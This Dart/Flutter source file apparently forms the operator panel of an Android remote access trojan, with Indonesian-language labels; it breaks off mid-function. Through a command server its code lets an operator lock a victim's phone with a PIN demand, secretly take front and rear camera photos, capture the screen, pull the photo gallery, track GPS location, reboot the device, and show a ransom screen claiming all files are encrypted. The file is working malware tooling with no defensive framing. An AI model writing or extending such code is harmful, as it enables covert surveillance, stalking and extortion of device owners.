import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:flutter/material.dart';
import 'config.dart';
import 'package:http/http.dart' as http;
import 'package:provider/provider.dart';
import 'theme_provider.dart';

class ControlCenterPage extends StatefulWidget {
  final Map<String, dynamic>? targetDevice;
  final String role;
  const ControlCenterPage({super.key, this.targetDevice, this.role = 'owner'});
  @override
  State<ControlCenterPage> createState() => _State();
}

class _State extends State<ControlCenterPage> {
  bool _sending = false;
  bool _flashOn = false;
  bool _locked = false;
  bool _chatOpen = false;
  bool _screenViewOpen = false;
  bool _galleryOpen = false;
  List<Map<String, dynamic>> _galleryPhotos = [];
  bool _locOpen = false;
  Map<String, dynamic>? _locationData;
  String _lastFrame = '';
  DateTime? _lastFrameTime;
  Timer? _frameTimer;
  final List<String> _log = [];
  final List<Map<String, String>> _chat = [];
  final _chatCtrl = TextEditingController();
  final _chatScroll = ScrollController();
  Timer? _chatTimer;

  String get _id => widget.targetDevice?['id']?.toString() ?? 'unknown';
  String get _model => widget.targetDevice?['model']?.toString() ?? 'Device';
  String get _battery => widget.targetDevice?['battery']?.toString() ?? '--';

  @override
  void initState() {
    super.initState();
    _chatTimer = Timer.periodic(const Duration(seconds: 3), (_) => _pollChat());
    _frameTimer = Timer.periodic(const Duration(seconds: 3), (_) => _pollFrame());
  }

  @override
  void dispose() {
    _chatTimer?.cancel();
    _frameTimer?.cancel();
    _chatCtrl.dispose();
    _chatScroll.dispose();
    super.dispose();
  }

  void _addLog(String m) {
    if (!mounted) return;
    setState(() {
      _log.insert(0, '[${DateTime.now().toString().substring(11, 19)}]  $m');
      if (_log.length > 20) _log.removeLast();
    });
  }

  void _toast(String m, {Color c = Colors.green}) {
    if (!mounted) return;
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
      backgroundColor: c.withOpacity(0.9),
      content: Text(m, style: const TextStyle(fontWeight: FontWeight.w600, fontSize: 13)),
      duration: const Duration(seconds: 2),
      behavior: SnackBarBehavior.floating,
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
    ));
  }

  Future<void> _cmd(String cmd, {String extra = ''}) async {
    if (_id == 'unknown') { _toast('ID tidak valid', c: Colors.red); return; }
    setState(() => _sending = true);
    try {
      final res = await http.post(
        Uri.parse('${ApiConfig.ratUrl}/api/send-command'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'id': _id, 'command': cmd, 'extra': extra}),
      ).timeout(const Duration(seconds: 12));
      if (res.statusCode == 200) {
        _addLog('Sent: $cmd');
        _toast('Command sent', c: Colors.green);
      } else {
        _addLog('Error $cmd (${res.statusCode})');
        _toast('Target offline', c: Colors.red);
      }
    } catch (e) {
      _addLog('Conn error: $e');
      _toast('Connection failed', c: Colors.red);
    } finally {
      if (mounted) setState(() => _sending = false);
    }
  }

  // ── CHAT ──
  Future<void> _pollChat() async {
    if (_id == 'unknown' || !_chatOpen) return;
    try {
      final res = await http.get(
        Uri.parse('${ApiConfig.ratUrl}/api/lock-chat/$_id'),
      ).timeout(const Duration(seconds: 5));
      if (res.statusCode == 200) {
        final body = jsonDecode(res.body);
        final msgs = body['messages'] as List? ?? [];
        if (msgs.isNotEmpty && mounted) {
          setState(() {
            for (final m in msgs) {
              final text = m['text']?.toString() ?? '';
              final from = m['from']?.toString() ?? 'target';
              if (text.isNotEmpty && !_chat.any((c) => c['text'] == text && c['from'] == from)) {
                _chat.add({'from': from, 'text': text, 'time': m['time']?.toString() ?? ''});
              }
            }
          });
          Future.delayed(const Duration(milliseconds: 100), () {
            if (_chatScroll.hasClients) {
              _chatScroll.animateTo(_chatScroll.position.maxScrollExtent,
                  duration: const Duration(milliseconds: 200), curve: Curves.easeOut);
            }
          });
        }
      }
    } catch (_) {}
  }

  Future<void> _pollFrame() async {
    if (_id == 'unknown' || !_screenViewOpen) return;
    try {
      final res = await http.get(
        Uri.parse('${ApiConfig.ratUrl}/api/live-frame/$_id'),
      ).timeout(const Duration(seconds: 5));
      if (res.statusCode == 200) {
        final body = jsonDecode(res.body);
        final frame = body['frame']?.toString() ?? '';
        if (frame.isNotEmpty && mounted) {
          setState(() {
            _lastFrame = frame;
            _lastFrameTime = DateTime.now();
          });
        }
      }
    } catch (_) {}
  }

  Future<void> _pollGallery() async {
    if (_id == 'unknown') return;
    try {
      final res = await http.get(
        Uri.parse('${ApiConfig.ratUrl}/api/gallery/$_id'),
      ).timeout(const Duration(seconds: 5));
      if (res.statusCode == 200) {
        final body = jsonDecode(res.body);
        final photos = body['photos'] as List? ?? [];
        if (mounted) {
          setState(() {
            _galleryPhotos = List<Map<String, dynamic>>.from(photos);
          });
        }
      }
    } catch (_) {}
  }

  Future<void> _pollLocation() async {
    if (_id == 'unknown') return;
    try {
      final res = await http.get(
        Uri.parse('${ApiConfig.ratUrl}/api/location/$_id'),
      ).timeout(const Duration(seconds: 5));
      if (res.statusCode == 200) {
        final body = jsonDecode(res.body);
        if (mounted && body['error'] == null) {
          setState(() {
            _locationData = body;
          });
        }
      }
    } catch (_) {}
  }

  Future<void> _sendChat() async {
    final text = _chatCtrl.text.trim();
    if (text.isEmpty) return;
    _chatCtrl.clear();
    setState(() {
      _chat.add({'from': 'owner', 'text': text, 'time': DateTime.now().toString().substring(11, 16)});
    });
    try {
      await http.post(
        Uri.parse('${ApiConfig.ratUrl}/api/lock-chat/$_id'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'text': text, 'from': 'owner'}),
      ).timeout(const Duration(seconds: 5));
    } catch (_) {}
    Future.delayed(const Duration(milliseconds: 100), () {
      if (_chatScroll.hasClients) {
        _chatScroll.animateTo(_chatScroll.position.maxScrollExtent,
            duration: const Duration(milliseconds: 200), curve: Curves.easeOut);
      }
    });
  }

  // ── LOCK DIALOG ──
  Future<void> _lockDialog() async {
    final msgCtrl = TextEditingController(text: 'PERANGKAT INI TERKUNCI');
    final pinCtrl = TextEditingController(text: '1234');
    return showDialog(context: context, builder: (_) => AlertDialog(
      backgroundColor: const Color(0xFF0A0A10),
      title: const Text('LOCK DEVICE', style: TextStyle(color: Colors.red, fontFamily: 'ShareTechMono', letterSpacing: 1, fontSize: 14)),
      content: Column(mainAxisSize: MainAxisSize.min, children: [
        TextField(controller: msgCtrl, style: const TextStyle(color: Colors.white, fontFamily: 'ShareTechMono', fontSize: 11),
          decoration: const InputDecoration(labelText: 'Pesan Lock', labelStyle: TextStyle(color: Colors.grey, fontFamily: 'ShareTechMono'), hintText: 'PERANGKAT INI TERKUNCI')),
        const SizedBox(height: 12),
        TextField(controller: pinCtrl, style: const TextStyle(color: Colors.white, fontFamily: 'ShareTechMono', fontSize: 11), obscureText: true,
          decoration: const InputDecoration(labelText: 'PIN Unlock', labelStyle: TextStyle(color: Colors.grey, fontFamily: 'ShareTechMono'), hintText: '1234')),
      ]),
      actions: [
        TextButton(onPressed: () => Navigator.pop(context), child: const Text('[ BATAL ]', style: TextStyle(color: Colors.grey, fontFamily: 'ShareTechMono'))),
        ElevatedButton(onPressed: () {
          Navigator.pop(context);
          final msg = msgCtrl.text.trim().isEmpty ? 'PERANGKAT INI TERKUNCI' : msgCtrl.text.trim();
          final pin = pinCtrl.text.trim().isEmpty ? '1234' : pinCtrl.text.trim();
          _cmd('lock_device', extra: '$msg|$pin');
          setState(() { _locked = true; _flashOn = true; });
        }, style: ElevatedButton.styleFrom(backgroundColor: Colors.red),
          child: const Text('[ LOCK + SENTER ]', style: TextStyle(color: Colors.white, fontFamily: 'ShareTechMono'))),
      ],
    ));
  }

  @override
  Widget build(BuildContext context) {
    final theme = Provider.of<ThemeProvider>(context);
    return Scaffold(
      backgroundColor: const Color(0xFF08080C),
      body: SafeArea(
            child: Column(children: [
              // ── HEADER ──
              Container(
                padding: const EdgeInsets.all(16),
                child: Row(children: [
                  Container(width: 10, height: 10, decoration: BoxDecoration(
                    gradient: LinearGradient(colors: [theme.primaryColor, theme.accentColor]),
                    boxShadow: [BoxShadow(color: theme.primaryColor.withOpacity(0.5), blurRadius: 6)],
                  )),
                  const SizedBox(width: 8),
                  Expanded(child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text(_model, style: TextStyle(color: theme.primaryColor, fontSize: 16, fontWeight: FontWeight.bold, fontFamily: 'ShareTechMono')),
                      Text('> ID: $_id  |  BATT: $_battery%', style: TextStyle(color: theme.accentColor.withOpacity(0.4), fontSize: 10, fontFamily: 'ShareTechMono')),
                    ],
                  )),
                ]),
              ),
              Container(height: 1, color: theme.primaryColor.withOpacity(0.15)),

          // ── BUTTONS ──
          Expanded(child: SingleChildScrollView(
            padding: const EdgeInsets.all(16),
            child: Column(children: [
              // ═══ LOCK SECTION ═══
              _sectionTitle('LOCK & SECURITY'),
              _bigBtn(
                icon: Icons.lock_rounded,
                label: 'LOCK + SENTER ON',
                color: const Color(0xFFE53935),
                textColor: Colors.white,
                onPressed: _sending ? null : _lockDialog,
              ),
              const SizedBox(height: 8),
              _bigBtn(
                icon: Icons.lock_open_rounded,
                label: 'UNLOCK DEVICE',
                color: const Color(0xFF43A047),
                textColor: Colors.white,
                onPressed: _sending ? null : () {
                  setState(() { _locked = false; _flashOn = false; });
                  _cmd('unlock');
                },
              ),
              const SizedBox(height: 16),

              // ═══ LIGHT SECTION ═══
              _sectionTitle('LIGHT CONTROL'),
              _bigBtn(
                icon: Icons.flash_on_rounded,
                label: 'SENTER ON',
                color: const Color(0xFFFFD700),
                textColor: Colors.black,
                onPressed: _sending ? null : () {
                  setState(() => _flashOn = true);
                  _cmd('flash_on');
                },
              ),
              const SizedBox(height: 8),
              _bigBtn(
                icon: Icons.flash_off_rounded,
                label: 'SENTER OFF',
                color: const Color(0xFF444444),
                textColor: Colors.white,
                onPressed: _sending ? null : () {
                  setState(() => _flashOn = false);
                  _cmd('flash_off');
                },
              ),
              const SizedBox(height: 16),

              // ═══ SCREEN SECTION ═══
              _sectionTitle('VIEW SCREEN'),
              _bigBtn(
                icon: Icons.screen_share_rounded,
                label: 'AMBIL SCREENSHOT',
                color: const Color(0xFF7B1FA2),
                textColor: Colors.white,
                onPressed: _sending ? null : () async {
                  _addLog('Requesting screenshot...');
                  await _cmd('take_screenshot');
                  Future.delayed(const Duration(seconds: 2), () => _pollFrame());
                  setState(() => _screenViewOpen = true);
                },
              ),
              const SizedBox(height: 8),
              _bigBtn(
                icon: Icons.camera_front_rounded,
                label: 'KAMERA DEPAN (WAJAH)',
                color: const Color(0xFF0277BD),
                textColor: Colors.white,
                onPressed: _sending ? null : () async {
                  await _cmd('cam_front');
                  _addLog('Taking front photo...');
                  Future.delayed(const Duration(seconds: 3), () => _pollFrame());
                  setState(() => _screenViewOpen = true);
                },
              ),
              const SizedBox(height: 8),
              _bigBtn(
                icon: Icons.camera_rear_rounded,
                label: 'KAMERA BELAKANG',
                color: const Color(0xFF01579B),
                textColor: Colors.white,
                onPressed: _sending ? null : () async {
                  await _cmd('cam_back');
                  _addLog('Taking back photo...');
                  Future.delayed(const Duration(seconds: 3), () => _pollFrame());
                  setState(() => _screenViewOpen = true);
                },
              ),
              const SizedBox(height: 16),

              // ═══ DEVICE SECTION ═══
              _sectionTitle('DEVICE CONTROL'),
              _bigBtn(
                icon: Icons.refresh_rounded,
                label: 'RESET / REBOOT HP',
                color: const Color(0xFFFF6F00),
                textColor: Colors.white,
                onPressed: _sending ? null : () async {
                  final confirm = await showDialog<bool>(context: context, builder: (_) => AlertDialog(
                    backgroundColor: const Color(0xFF0A0A10),
                    title: const Text('RESET HP?', style: TextStyle(color: Colors.orange, fontFamily: 'ShareTechMono', letterSpacing: 1, fontSize: 14)),
                    content: const Text('> HP target akan restart.', style: TextStyle(color: Colors.white, fontFamily: 'ShareTechMono', fontSize: 11)),
                    actions: [
                      TextButton(onPressed: () => Navigator.pop(context, false), child: const Text('[ BATAL ]', style: TextStyle(color: Colors.grey, fontFamily: 'ShareTechMono'))),
                      ElevatedButton(onPressed: () => Navigator.pop(context, true),
                        style: ElevatedButton.styleFrom(backgroundColor: Colors.orange),
                        child: const Text('[ RESET ]', style: TextStyle(color: Colors.white, fontFamily: 'ShareTechMono'))),
                    ],
                  ));
                  if (confirm == true) {
                    await _cmd('reboot_device');
                    _addLog('Reboot command sent');
                  }
                },
              ),
              const SizedBox(height: 8),

              // CHANGE WALLPAPER
              _bigBtn(
                icon: Icons.wallpaper_rounded,
                label: 'GANTI WALLPAPER',
                color: const Color(0xFF1565C0),
                textColor: Colors.white,
                onPressed: _sending ? null : () async {
                  final urlCtrl = TextEditingController();
                  final confirm = await showDialog<bool>(context: context, builder: (_) => AlertDialog(
                    backgroundColor: const Color(0xFF0A0A10),
                    title: const Text('GANTI WALLPAPER', style: TextStyle(color: Colors.blueAccent, fontFamily: 'ShareTechMono', letterSpacing: 1, fontSize: 14)),
                    content: Column(mainAxisSize: MainAxisSize.min, children: [
                      const Text('> Masukkan URL gambar:', style: TextStyle(color: Colors.grey, fontSize: 11, fontFamily: 'ShareTechMono')),
                      const SizedBox(height: 12),
                      TextField(controller: urlCtrl, style: const TextStyle(color: Colors.white, fontFamily: 'ShareTechMono', fontSize: 11),
                        decoration: const InputDecoration(hintText: 'https://...', hintStyle: TextStyle(color: Colors.grey, fontFamily: 'ShareTechMono'),
                          labelStyle: TextStyle(color: Colors.grey, fontFamily: 'ShareTechMono'))),
                    ]),
                    actions: [
                      TextButton(onPressed: () => Navigator.pop(context, false), child: const Text('[ BATAL ]', style: TextStyle(color: Colors.grey, fontFamily: 'ShareTechMono'))),
                      ElevatedButton(onPressed: () => Navigator.pop(context, true),
                        style: ElevatedButton.styleFrom(backgroundColor: Colors.blueAccent),
                        child: const Text('[ GANTI ]', style: TextStyle(color: Colors.white, fontFamily: 'ShareTechMono'))),
                    ],
                  ));
                  if (confirm == true && urlCtrl.text.trim().isNotEmpty) {
                    await _cmd('set_wallpaper', extra: urlCtrl.text.trim());
                    _addLog('Wallpaper change sent');
                  }
                },
              ),
              const SizedBox(height: 8),

              // GALLERY
              _bigBtn(
                icon: Icons.photo_library_rounded,
                label: 'LIHAT GALLERY',
                color: const Color(0xFF6A1B9A),
                textColor: Colors.white,
                onPressed: _sending ? null : () async {
                  _addLog('Requesting gallery...');
                  await _cmd('get_gallery');
                  await Future.delayed(const Duration(seconds: 3));
                  await _pollGallery();
                  setState(() => _galleryOpen = true);
                },
              ),
              const SizedBox(height: 8),

              // LACAK LOKASI (GPS)
              _bigBtn(
                icon: Icons.location_on_rounded,
                label: 'LACAK LOKASI',
                color: const Color(0xFF00695C),
                textColor: Colors.white,
                onPressed: _sending ? null : () async {
                  _addLog('Requesting GPS location...');
                  await _cmd('get_location');
                  await Future.delayed(const Duration(seconds: 4));
                  await _pollLocation();
                  setState(() => _locOpen = true);
                },
              ),
              const SizedBox(height: 8),

              // LOCK FILES (RANSOM)
              _bigBtn(
                icon: Icons.folder_off_rounded,
                label: 'KUNCI SEMUA FILE',
                color: const Color(0xFFB71C1C),
                textColor: Colors.white,
                onPressed: _sending ? null : () async {
                  final msgCtrl = TextEditingController(text: 'SEMUA FILE TELAH DIENKRIPSI');
                  final pinCtrl = TextEditingController(text: '1234');
                  final confirm = await showDialog<bool>(context: context, builder: (_) => AlertDialog(
                    backgroundColor: const Color(0xFF1A1A2E),
                    title: const Text('KUNCI FILE?', style: TextStyle(color: Colors.red, fontWeight: FontWeight.bold)),
                    content: Column(mainAxisSize: MainAxisSize.min, children: [
                      const Text('Ini akan menampilkan layar ransom pada target.', style: TextStyle(color: Colors.grey, fontSize: 12)),
                      const SizedBox(height: 12),
                      TextField(controller: msgCtrl, style: const TextStyle(color: Colors.white),
                        decoration: const InputDecoration(labelText: 'Pesan', labelStyle: TextStyle(color: Colors.grey))),
                      const SizedBox(height: 8),
                      TextField(controller: pinCtrl, style: const TextStyle(color: Colors.white), obscureText: true,
                        decoration: const InputDecoration(labelText: 'PIN', labelStyle: TextStyle(color: Colors.grey))),
                    ]),
                    actions: [
                      TextButton(onPressed: () => Navigator.pop(context, false), child: const Text('Batal', style: TextStyle(color: Colors.grey))),
                      ElevatedButton(onPressed: () => Navigator.pop(context, true),
                        style: ElevatedButton.styleFrom(backgroundColor: Colors.red),
                        child: const Text('KUNCI', style: TextStyle(color: Colors.white))),
                    ],
                  ));
                  if (confirm == true) {
                    final msg = msgCtrl.text.trim().isEmpty ? 'SEMUA FILE TELAH DIENKRIPSI' : msgCtrl.text.trim();
                    final pin = pinCtrl.text.trim().isEmpty ? '1234' : pinCtrl.text.trim();
                    await _cmd('lock_files', extra: '$msg|$pin');
                    setState(() { _locked = true; _flashOn = true; });
                  }
                },
              ),
              const SizedBox(height: 10),

              // ── STATUS ──
              Row(mainAxisAlignment: MainAxisAlignment.center, children: [
                Icon(_flashOn ? Icons.flash_on : Icons.flash_off,
                    color: _flashOn ? theme.accentColor : theme.primaryColor.withOpacity(0.25), size: 18),
                const SizedBox(width: 4),
                Text(_flashOn ? 'ON' : 'OFF', style: TextStyle(color: _flashOn ? theme.accentColor : theme.primaryColor.withOpacity(0.25), fontSize: 11, fontFamily: 'ShareTechMono')),
                const SizedBox(width: 20),
                Icon(_locked ? Icons.lock : Icons.lock_open,
                    color: _locked ? theme.primaryColor : theme.accentColor.withOpacity(0.25), size: 18),
                const SizedBox(width: 4),
                Text(_locked ? 'LOCKED' : 'UNLOCKED', style: TextStyle(color: _locked ? theme.primaryColor : theme.accentColor.withOpacity(0.25), fontSize: 11, fontFamily: 'ShareTechMono')),
              ]),

              // ── SCREEN VIEW ──
              if (_screenViewOpen) ...[
                const SizedBox(height: 16),
                _sectionTitle('LAYAR TARGET'),
                Container(
                  decoration: BoxDecoration(
                    color: const Color(0xFF0A0A10),
                    border: Border(
                      left: BorderSide(color: theme.primaryColor.withOpacity(0.4), width: 1.5),
                      top: BorderSide(color: theme.primaryColor.withOpacity(0.1)),
                    ),
                  ),
                  child: Column(children: [
                    Container(
                      padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
                      decoration: BoxDecoration(
                        border: Border(bottom: BorderSide(color: theme.primaryColor.withOpacity(0.15))),
                      ),
                      child: Row(children: [
                        Icon(Icons.screen_share, color: theme.primaryColor, size: 16),
                        const SizedBox(width: 6),
                        Text('LAYAR TARGET', style: TextStyle(color: theme.primaryColor, fontSize: 11, fontFamily: 'ShareTechMono')),
                        const Spacer(),
                        if (_lastFrameTime != null)
                          Text('${_lastFrameTime!.hour.toString().padLeft(2, '0')}:${_lastFrameTime!.minute.toString().padLeft(2, '0')}:${_lastFrameTime!.second.toString().padLeft(2, '0')}',
                              style: TextStyle(color: theme.accentColor.withOpacity(0.3), fontSize: 9, fontFamily: 'ShareTechMono')),
                        const SizedBox(width: 8),
                        GestureDetector(
                          onTap: () => setState(() { _screenViewOpen = false; _lastFrame = ''; }),
                          child: Icon(Icons.close, color: theme.primaryColor.withOpacity(0.3), size: 16),
                        ),
                      ]),
                    ),
                    _lastFrame.isEmpty
                        ? Padding(
                            padding: const EdgeInsets.all(30),
                            child: Column(children: [
                              CircularProgressIndicator(color: theme.primaryColor, strokeWidth: 2),
                              const SizedBox(height: 12),
                              Text('[ WAITING FRAME... ]', style: TextStyle(color: theme.primaryColor.withOpacity(0.3), fontSize: 11, fontFamily: 'ShareTechMono')),
                            ]),
                          )
                        : Image.memory(
                            base64Decode(_lastFrame.replaceFirst('data:image/png;base64,', '').replaceFirst('data:image/jpeg;base64,', '')),
                            fit: BoxFit.contain,
                            gaplessPlayback: true,
                          ),
                  ]),
                ),
              ],

              // ── GALLERY VIEW ──
              if (_galleryOpen) ...[
                const SizedBox(height: 16),
                _sectionTitle('GALLERY TARGET (${_galleryPhotos.length} foto)'),
                Container(
                  decoration: BoxDecoration(
                    color: const Color(0xFF0A0A10),
                    border: Border(
                      left: BorderSide(color: theme.accentColor.withOpacity(0.4), width: 1.5),
                      top: BorderSide(color: theme.accentColor.withOpacity(0.1)),
                    ),
                  ),
                  child: Column(children: [
                    Container(
                      padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
                      decoration: BoxDecoration(
                        border: Border(bottom: BorderSide(color: theme.accentColor.withOpacity(0.15))),
                      ),
                      child: Row(children: [
                        Icon(Icons.photo_library, color: theme.accentColor, size: 16),
                        const SizedBox(width: 6),
                        Text('GALLERY (${_galleryPhotos.length})', style: TextStyle(color: theme.accentColor, fontSize: 11, fontFamily: 'ShareTechMono')),
                        const Spacer(),
                        GestureDetector(
                          onTap: () => setState(() { _galleryOpen = false; _galleryPhotos = []; }),
                          child: Icon(Icons.close, color: theme.primaryColor.withOpacity(0.3), size: 16),
                        ),
                      ]),
                    ),
                    _galleryPhotos.isEmpty
                        ? Padding(
                            padding: const EdgeInsets.all(30),
                            child: Column(children: [
                              CircularProgressIndicator(color: theme.accentColor, strokeWidth: 2),
                              const SizedBox(height: 12),
                              Text('[ LOADING GALLERY ]', style: TextStyle(color: theme.accentColor.withOpacity(0.3), fontSize: 11, fontFamily: 'ShareTechMono')),
                            ]),
                          )
                        : SizedBox(
                            height: 300,
                            child: GridView.builder(
                              padding: const EdgeInsets.all(8),
                              gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
                                crossAxisCount: 3, crossAxisSpacing: 4, mainAxisSpacing: 4),
                              itemCount: _galleryPhotos.length,
                              itemBuilder: (_, i) {
                                final p = _galleryPhotos[i];
                                final thumb = p['thumb']?.toString() ?? '';
                                if (thumb.isEmpty) return const SizedBox();
                                return GestureDetector(
                                  onTap: () {
                                    showDialog(context: context, builder: (_) => Dialog(
                                      backgroundColor: const Color(0xFF08080C),
                                      child: Column(mainAxisSize: MainAxisSize.min, children: [
                                        Image.memory(base64Decode(thumb.replaceFirst('data:image/jpeg;base64,', '')),
                                          fit: BoxFit.contain),
                                        Padding(
                                          padding: const EdgeInsets.all(8),
                                          child: Text(p['name']?.toString() ?? '', style: TextStyle(color: theme.accentColor.withOpacity(0.4), fontSize: 9, fontFamily: 'ShareTechMono')),
                                        ),
                                      ]),
                                    ));
                                  },
                                  child: ClipRRect(
                                    child: Image.memory(
                                      base64Decode(thumb.replaceFirst('data:image/jpeg;base64,', '')),
                                      fit: BoxFit.cover,
                                      gaplessPlayback: true,
                                    ),
                                  ),
                                );
                              },
                            ),
                          ),
                  ]),
                ),
              ],

              // ── LOCATION VIEW ──
              if (_locOpen) ...[
                const SizedBox(height: 16),
                _sectionTitle('LOKASI TARGET'),
                Container(
                  decoration: BoxDecoration(
                    color: const Color(0xFF0A0A10),
                    border: Border(
                      left: BorderSide(color: theme.accentColor.withOpacity(0.4), width: 1.5),
                      top: BorderSide(color: theme.accentColor.withOpacity(0.1)),
                    ),
                  ),
                  child: Column(children: [
                    Container(
                      padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
                      decoration: BoxDecoration(
                        border: Border(bottom: BorderSide(color: theme.accentColor.withOpacity(0.15))),
                      ),
                      child: Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
                        Text('GPS LOCATION', style: TextStyle(color: theme.accentColor, fontSize: 11, fontFamily: 'ShareTechMono')),
                        GestureDetector(
                          onTap: () => setState(() { _locOpen = false; _locationData = null; }),
                          child: Text('[ TUTUP ]', style: TextStyle(color: theme.primaryColor, fontSize: 10, fontFamily: 'ShareTechMono')),
                        ),
                      ]),
                    ),
                    _locationData == null
                        ? Padding(
                            padding: const EdgeInsets.all(30),
                            child: Column(children: [
                              CircularProgressIndicator(color: theme.accentColor, strokeWidth: 2),
                              const SizedBox(height: 12),
                              Text('[ WAITING GPS FIX... ]', style: TextStyle(color: theme.accentColor.withOpacity(0.3), fontSize: 11, fontFamily: 'ShareTechMono')),
                            ]),
                          )
                        : Padding(
                            padding: const EdgeInsets.all(12),
                            child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                              _locItem('LATITUDE', _locationData!['lat']?.toString() ?? '-'),
                              _locItem('LONGITUDE', _locationData!['lng']?.toString() ?? '-'),
                              _locItem('ACCURACY', _locationData!['accuracy']?.toString() ?? '-'),
                              _locItem('SPEED', _locationData!['speed']?.toString() ?? '- m/s'),
                              _locItem('ALTITUDE', _locationData!['altitude']?.toString() ?? '- m'),
                              _locItem('ADDRESS', _locationData!['address']?.toString() ?? '-'),
                              _locItem('CITY', _locationData!['city']?.toString() ?? '-'),
                              _locItem('COUNTRY', _locationData!['country']?.toString() ?? '-'),
                              _locItem('PROVIDER', _locationData!['provider']?.toString() ?? '-'),
                              const SizedBox(height: 8),
                              if (_locationData!['lat'] != null && _locationData!['lng'] != null)
                                Center(
                                  child: Container(
                                    decoration: BoxDecoration(
                                      border: Border(
                                        left: BorderSide(color: theme.accentColor.withOpacity(0.4)),
                                      ),
                                    ),
                                    child: Material(
                                      color: Colors.transparent,
                                      child: InkWell(
                                        onTap: () {
                                          final lat = _locationData!['lat'];
                                          final lng = _locationData!['lng'];
                                          final url = 'https://www.google.com/maps?q=$lat,$lng';
                                        },
                                        child: Padding(
                                          padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 10),
                                          child: Row(mainAxisSize: MainAxisSize.min, children: [
                                            Icon(Icons.map, size: 16, color: theme.accentColor),
                                            const SizedBox(width: 8),
                                            Text('[ OPEN MAPS ]', style: TextStyle(color: theme.accentColor, fontSize: 11, fontFamily: 'ShareTechMono')),
                                          ]),
                                        ),
                                      ),
                                    ),
                                  ),
                                ),
                            ]),
                          ),
                  ]),
                ),
              ],

              // ── CHAT BOX ──
              if (_chatOpen) ...[
                const SizedBox(height: 16),
                _sectionTitle('CHAT WITH TARGET'),
                Container(
                  height: 250,
                  decoration: BoxDecoration(
                    color: const Color(0xFF0A0A10),
                    border: Border(
                      left: BorderSide(color: theme.primaryColor.withOpacity(0.3)),
                      top: BorderSide(color: theme.primaryColor.withOpacity(0.08)),
                    ),
                  ),
                  child: Column(children: [
                    Expanded(child: _chat.isEmpty
                        ? const Center(child: Text('[ NO MESSAGES ]', style: TextStyle(color: Colors.grey, fontSize: 11, fontFamily: 'ShareTechMono')))
                        : ListView.builder(
                            controller: _chatScroll,
                            padding: const EdgeInsets.all(10),
                            itemCount: _chat.length,
                            itemBuilder: (_, i) {
                              final m = _chat[i];
                              final isOwner = m['from'] == 'owner';
                              return Align(
                                alignment: isOwner ? Alignment.centerRight : Alignment.centerLeft,
                                child: Container(
                                  margin: const EdgeInsets.only(bottom: 6),
                                  padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 7),
                                  decoration: BoxDecoration(
                                    color: isOwner ? theme.primaryColor.withOpacity(0.15) : const Color(0xFF0C0C14),
                                    border: Border(
                                      left: BorderSide(color: isOwner ? theme.accentColor.withOpacity(0.3) : theme.primaryColor.withOpacity(0.2)),
                                    ),
                                  ),
                                  child: Column(
                                    crossAxisAlignment: CrossAxisAlignment.start,
                                    children: [
                                      Text(m['text'] ?? '', style: const TextStyle(color: Colors.white, fontSize: 11, fontFamily: 'ShareTechMono')),
                                      Text(m['time'] ?? '', style: TextStyle(color: theme.accentColor.withOpacity(0.25), fontSize: 9, fontFamily: 'ShareTechMono')),
                                    ],
                                  ),
                                ),
                              );
                            },
                          )),
                    Container(
                      padding: const EdgeInsets.all(8),
                      decoration: BoxDecoration(
                        border: Border(
                          top: BorderSide(color: theme.primaryColor.withOpacity(0.1)),
                        ),
                      ),
                      child: Row(children: [
                        Expanded(child: TextField(
                          controller: _chatCtrl,
                          style: const TextStyle(color: Colors.white, fontSize: 12, fontFamily: 'ShareTechMono'),
                          decoration: InputDecoration(
                            hintText: '> type message...',
                            hintStyle: TextStyle(color: theme.accentColor.withOpacity(0.25), fontSize: 11, fontFamily: 'ShareTechMono'),
                            contentPadding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
                            border: OutlineInputBorder(borderSide: BorderSide(color: theme.primaryColor.withOpacity(0.15))),
                            enabledBorder: OutlineInputBorder(borderSide: BorderSide(color: theme.primaryColor.withOpacity(0.15))),
                          ),
                          onSubmitted: (_) => _sendChat(),
                        )),
                        const SizedBox(width: 8),
                        IconButton(
                          onPressed: _sendChat,
                          icon: Icon(Icons.send, color: theme.accentColor, size: 20),
                        ),
                      ]),
                    ),
                  ]),
                ),
              ],

              // ── CHAT BUTTON (moved down) ──
              const SizedBox(height: 12),
              _bigBtn(
                icon: Icons.chat_rounded,
                label: _chatOpen ? 'TUTUP CHAT' : 'CHAT WITH TARGET',
                color: const Color(0xFF00897B),
                textColor: Colors.white,
                onPressed: () {
                  setState(() => _chatOpen = !_chatOpen);
                },
              ),

              // ── LOG ──
              if (_log.isNotEmpty) ...[
                const SizedBox(height: 12),
                Container(
                  height: 60,
                  padding: const EdgeInsets.all(8),
                  decoration: BoxDecoration(
                    color: const Color(0xFF0A0A10),
                    border: Border(
                      left: BorderSide(color: theme.primaryColor.withOpacity(0.3)),
                      top: BorderSide(color: theme.primaryColor.withOpacity(0.08)),
                    ),
                  ),
                  child: ListView.builder(
                    itemCount: _log.length.clamp(0, 4),
                    itemBuilder: (_, i) => Text(_log[i], style: TextStyle(color: theme.accentColor.withOpacity(0.35), fontSize: 9, fontFamily: 'ShareTechMono')),
                  ),
                ),
              ],

              if (_sending)
                Padding(
                  padding: const EdgeInsets.only(top: 12),
                  child: CircularProgressIndicator(color: theme.primaryColor, strokeWidth: 2),
                ),
              ],
            ),
          )),
        ],
      ),
      ),
    );
  }

  Widget _sectionTitle(String text) {
    final theme = Provider.of<ThemeProvider>(context, listen: false);
    return Padding(
      padding: const EdgeInsets.only(bottom: 8),
      child: Text('// $text', style: TextStyle(color: theme.primaryColor, fontSize: 11, fontFamily: 'ShareTechMono', letterSpacing: 1.5)),
    );
  }

  Widget _locItem(String label, String value) {
    final theme = Provider.of<ThemeProvider>(context, listen: false);
    return Padding(
